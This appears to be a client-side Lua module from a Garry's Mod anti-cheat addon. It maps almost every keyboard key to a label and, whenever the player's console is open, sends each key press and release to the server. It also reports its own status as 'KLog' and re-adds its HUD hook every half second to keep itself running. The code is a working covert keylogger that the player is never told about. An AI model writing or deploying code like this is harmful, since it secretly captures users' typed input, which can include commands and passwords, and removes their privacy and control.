

local Setup = {
	[KEY_LSHIFT] = {"*LSHIFT"},
	[KEY_RSHIFT] = {"*RSHIFT"},
	[KEY_LEFT] = {"*LEFT"},
	[KEY_FIRST] = {"*FIRST"},
	[KEY_LALT] = {"*LALT"},
	[KEY_RALT] = {"*RALT"},
	
	[KEY_INSERT] = "*INS*",
	[KEY_CAPSLOCK] = "*CAPSLOCK*",
	[KEY_CAPSLOCKTOGGLE] = "*CAPS*",
	[KEY_APP] = "*APP*",
	[KEY_LCONTROL] = "*LCTRL*",
	[KEY_LAST] = "*LAST*",
	[KEY_COUNT] = "*COUNT*",
	[KEY_BACKQUOTE] = "*BACK_QT*",
	[KEY_HOME] = "*HOME*",
	[KEY_NUMLOCKTOGGLE] = "*NUM_LCK_T*",
	[KEY_BACKSPACE] = "*BACK_SP*",
	[KEY_PAGEUP] = "*PGUP*",
	[KEY_PAGEDOWN] = "*PGDN*",
	[KEY_LWIN] = "*L_WIN*",
	[KEY_ESCAPE] = "*ESC*",
	[KEY_DOWN] = "*DOWN*",
	[KEY_UP] = "*UP*",
	[KEY_SCROLLLOCKTOGGLE] = "*SCRL_LCK_T*",
	[KEY_BREAK] = "*BREAK*",
	[KEY_RIGHT] = "*RIGHT*",
	[KEY_RWIN] = "*R_WIN*",
	[KEY_RCONTROL] = "*R_CTRL*",
	[KEY_DELETE] = "*DEL*",
	[KEY_END] = "*END*",
	[KEY_NUMLOCK] = "*NUMLCK*",
	[KEY_SCROLLLOCK] = "*SCRL_LCK*",
	
	[KEY_COMMA] = ".",
	[KEY_SEMICOLON] = ";",
	[KEY_BACKSLASH] = "\\",
	[KEY_PAD_MULTIPLY] = "*",
	[KEY_EQUAL] = "=",
	[KEY_APOSTROPHE] = "'",
	[KEY_RBRACKET] = "]",
	[KEY_SLASH] = "/",
	[KEY_MINUS] = "-",
	[KEY_SPACE] = " ",
	[KEY_PERIOD] = ".",
	[KEY_LBRACKET] = "[",
	[KEY_TAB] = "\t",
	[KEY_ENTER] = "\n",
	
	[KEY_PAD_6] = "6",
	[KEY_PAD_0] = "0",
	[KEY_PAD_8] = "8",
	[KEY_PAD_MINUS] = "-",
	[KEY_PAD_DIVIDE] = "/",
	[KEY_PAD_3] = "3",
	[KEY_PAD_2] = "2",
	[KEY_PAD_PLUS] = "+",
	[KEY_PAD_7] = "7",
	[KEY_PAD_ENTER] = "\n",
	[KEY_PAD_DECIMAL] = ".",
	[KEY_PAD_5] = "5",
	[KEY_PAD_4] = "4",
	[KEY_PAD_1] = "1",
	
	[KEY_1] = "1",
	[KEY_3] = "3",
	[KEY_0] = "0",
	[KEY_2] = "2",
	[KEY_5] = "5",
	[KEY_4] = "4",
	[KEY_6] = "6",
	[KEY_9] = "9",
	
	[KEY_F1] = "*F1*",
	[KEY_F12] = "*F12*",
	[KEY_F2] = "*F2*",
	[KEY_F10] = "*F10*",
	[KEY_F7] = "*F7*",
	[KEY_F4] = "*F4*",
	[KEY_F5] = "*F5*",
	[KEY_F9] = "*F9*",
	[KEY_F8] = "*F8*",
	[KEY_F6] = "*F6*",
	[KEY_F11] = "*F11*",
	[KEY_F3] = "*F3*",
	
	
	[KEY_Z] = "z",
	[KEY_M] = "m",
	[KEY_O] = "o",
	[KEY_Q] = "q",
	[KEY_A] = "a",
	[KEY_P] = "p",
	[KEY_N] = "n",
	[KEY_F] = "f",
	[KEY_H] = "h",
	[KEY_X] = "x",
	[KEY_S] = "s",
	[KEY_J] = "j",
	[KEY_8] = "8",
	[KEY_C] = "c",
	[KEY_L] = "l",
	[KEY_B] = "b",
	[KEY_T] = "t",
	[KEY_R] = "r",
	[KEY_W] = "w",
	[KEY_I] = "i",
	[KEY_7] = "7",
	[KEY_U] = "u",
	[KEY_V] = "v",
	[KEY_D] = "d",
	[KEY_K] = "k",
	[KEY_E] = "e",
	[KEY_G] = "g",
	[KEY_Y] = "y",
}

local Keys = {}
for k,v in _H.pairs(Setup) do
	Keys[k] = {}
end


local This
local function Buffer(Char)
	_E.net.Start( _H.tostring(This) )
		_E.net.WriteString(Char)
	_E.net.SendToServer()
end


local Con_One = false
local Con_Two = false
local function CCHUD()
	local IsConsoleVisible = _E.gui.IsConsoleVisible()
	
	if IsConsoleVisible then
		if not Con_One then
			Con_One = true
			Con_Two = false
			
			_H.NotGMG("KLog=O")
		end
	else
		if not Con_Two then
			Con_Two = true
			
			if Con_One then
				_H.NotGMG("KLog=C")
			end
			Con_One = false
		end
	end
	if not IsConsoleVisible then return end
	
	for Key,v in _H.pairs(Keys) do
		if _E.input.IsKeyDown(Key) then
			if not v.Down_One then
				v.Down_One = true
				v.Down_Two = false
				
				local Char = Setup[ Key ]
				if _E.istable(Char) then
					Buffer(Char[1].."_DN*")
				else
					Buffer(Char)
				end
			end
		else
			if not v.Down_Two then
				v.Down_Two = true
				
				if v.Down_One then
					local Char = Setup[ Key ]
					if _E.istable(Char) then
						Buffer(Char[1].."_UP*")
					end
				end
				
				v.Down_One = false
			end
		end
	end
end
hook.Add("PreDrawHUD", "CCHUD", CCHUD)

local function Add()
	_H.NotTS(0.5, Add)
	hook.Add("PreDrawHUD", "CCHUD", CCHUD)
end
_H.NotTS(0.5, Add)

_H.NotGMG("KLog=Loaded")

return "false"

--HAC--









